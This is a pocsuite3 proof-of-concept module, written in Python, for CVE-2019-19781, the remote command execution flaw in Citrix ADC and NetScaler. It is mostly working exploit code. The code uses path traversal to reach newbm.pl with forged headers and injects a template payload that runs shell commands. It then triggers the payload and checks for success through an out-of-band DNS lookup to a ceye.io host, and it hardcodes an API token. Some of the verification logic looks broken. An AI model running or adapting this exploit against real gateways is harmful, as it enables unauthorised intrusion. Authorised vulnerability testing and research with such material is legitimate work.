#!/usr/bin/env python
# _*_ encoding：utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.lib.utils import random_str


class Citrix(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2020-01-11'
    createDate = '2020-11-11'
    updateDate = '2020-11-11'
    references = ['']
    name = 'Citrix ADC&NetScaler远程命令执行漏洞(CVE-2019-19781)'
    appPowerLink = 'https://support.citrix.com/article/CTX267027'
    appName = 'Citrix ADC&NetScaler'
    appVersion = 'Citrix NetScaler ADC and NetScaler Gateway version 10.5,' \
                 'Citrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1,' \
                 'Citrix ADC and Citrix Gateway version 13.0'
    vulType = 'rce'
    desc = '''
    Citrix ADC&NetScaler远程命令执行漏洞(CVE-2019-19781)
    '''

    def upload_xml(self, cmd):
        newbm_url = self.url + '/vpn/../vpns/portal/scripts/newbm.pl'
        headers = {
            "Connection": "close",
            "NSC_USER": "../../../netscaler/portal/templates/%s" % 'bigdream',
            "NSC_NONCE": "nsroot"
        }
        payload = "url=http://example.com&title=" + 'bigdream' + "&desc=[% template.new('BLOCK' = 'print `" + cmd + "`') %]"
        r = requests.post(url=newbm_url, headers=headers, data=payload, verify=False, allow_redirects=False)
        if r.status_code == 200 and 'parent.window.ns_reload' in r.content:
            return True
        else:
            return False

    def _verify(self):
        result = {}
        try:
            cmd = random_str(16) + '.6eb4yw.ceye.io'
            cmd2 = 'ping ' + cmd
            if self.upload_xml(cmd):
                xml_url = self.url + '/vpn/../vpns/portal/%s.xml' % 'bigdream'
                headers = {
                    "NSC_USER": "nsroot",
                    "NSC_NONCE": "nsroot"
                }
                r = requests.get(xml_url, headers=headers, verify=False)
                if r.status_code == 200:
                    res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
                    if cmd in res:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = self.url
                        result['VerifyInfo']['Payload'] = cmd2
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(Citrix)
